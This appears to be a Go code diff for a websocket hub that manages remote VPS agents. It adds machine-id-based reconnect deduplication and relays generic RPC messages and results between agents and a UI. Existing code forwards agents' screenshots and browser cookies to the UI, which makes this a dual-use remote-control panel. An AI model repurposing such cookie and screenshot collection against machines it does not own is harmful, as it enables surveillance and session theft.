@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"log"
+	"strings"
 	"sync"
 	"time"
 
@@ -30,6 +31,7 @@ const (
 type VPSInfo struct {
 	ID             string  `json:"id"`
 	Hostname       string  `json:"hostname"`
+	MachineID      string  `json:"machine_id,omitempty"`
 	LocalIP        string  `json:"local_ip,omitempty"`
 	Connected      bool    `json:"connected"`
 	LastSeen       int64   `json:"last_seen"`
@@ -47,10 +49,11 @@ type VPSInfo struct {
 }
 
 type AgentConn struct {
-	ID       string
-	Hostname string
-	Conn     *websocket.Conn
-	mu       sync.Mutex
+	ID         string
+	Hostname   string
+	MachineID  string // Windows MachineGuid / Linux machine-id; reconnect dedupe key
+	Conn       *websocket.Conn
+	mu         sync.Mutex
 
 	CpuPercent   float64
 	Cores        int
@@ -98,12 +101,46 @@ func NewHub(screenshotIntervalDefault int, autoRestartDefaultSec int) *Hub {
 	}
 }
 
-func (h *Hub) RegisterAgent(id, hostname string, c *websocket.Conn) *AgentConn {
+func (h *Hub) RegisterAgent(id, hostname, machineID string, c *websocket.Conn) *AgentConn {
+	hostKey := strings.TrimSpace(hostname)
+	if hostKey == "" {
+		hostKey = "unknown"
+	}
+	mid := strings.TrimSpace(machineID)
 	h.mu.Lock()
-	ac := &AgentConn{ID: id, Hostname: hostname, Conn: c}
+	// Reconnect dedupe: prefer machine_id (stable per OS install); else hostname (legacy agents).
+	var stale []*websocket.Conn
+	for existingID, a := range h.agents {
+		ah := strings.TrimSpace(a.Hostname)
+		am := strings.TrimSpace(a.MachineID)
+		same := false
+		switch {
+		case mid != "":
+			if strings.EqualFold(am, mid) {
+				same = true
+			} else if am == "" && strings.EqualFold(ah, hostKey) {
+				// Same box after upgrade: old session had no machine_id, new one does.
+				same = true
+			}
+		default:
+			// Legacy agent: only dedupe when neither connection reported a machine id.
+			if am == "" && strings.EqualFold(ah, hostKey) {
+				same = true
+			}
+		}
+		if same {
+			delete(h.agents, existingID)
+			stale = append(stale, a.Conn)
+		}
+	}
+	ac := &AgentConn{ID: id, Hostname: hostname, MachineID: mid, Conn: c}
 	h.agents[id] = ac
 	list := h.snapshotVPSListLocked()
 	h.mu.Unlock()
+	for _, old := range stale {
+		conn := old
+		go func() { _ = conn.Close() }()
+	}
 	h.BroadcastUI(map[string]any{"type": "vps_list", "vps": list})
 	return ac
 }
@@ -146,6 +183,7 @@ func (h *Hub) snapshotVPSListLocked() []VPSInfo {
 		vi := VPSInfo{
 			ID:        a.ID,
 			Hostname:  a.Hostname,
+			MachineID: a.MachineID,
 			LocalIP:   a.LocalIP,
 			Connected: true,
 			LastSeen:  time.Now().Unix(),
@@ -221,6 +259,24 @@ func (h *Hub) SendToAgent(agentID string, cmd Command, payload map[string]any) b
 	return err == nil
 }
 
+// SendJSONToAgent writes a prepared JSON message to one agent (used for agent_rpc).
+func (h *Hub) SendJSONToAgent(agentID string, msg map[string]any) bool {
+	h.mu.RLock()
+	a, ok := h.agents[agentID]
+	h.mu.RUnlock()
+	if !ok {
+		return false
+	}
+	b, err := json.Marshal(msg)
+	if err != nil {
+		return false
+	}
+	a.mu.Lock()
+	err = a.Conn.WriteMessage(websocket.TextMessage, b)
+	a.mu.Unlock()
+	return err == nil
+}
+
 func (h *Hub) BroadcastCommand(cmd Command, payload map[string]any) {
 	h.mu.RLock()
 	ids := make([]string, 0, len(h.agents))
@@ -248,6 +304,9 @@ func (h *Hub) HandleAgentMessage(agentID string, raw []byte) {
 		h.BroadcastUI(map[string]any{"type": "cookies", "vps_id": agentID, "data": txt})
 	case "metrics":
 		h.applyAgentMetrics(agentID, msg)
+	case "agent_rpc_result":
+		msg["vps_id"] = agentID
+		h.BroadcastUI(msg)
 	case "pong", "ack":
 		// no-op
 	default:
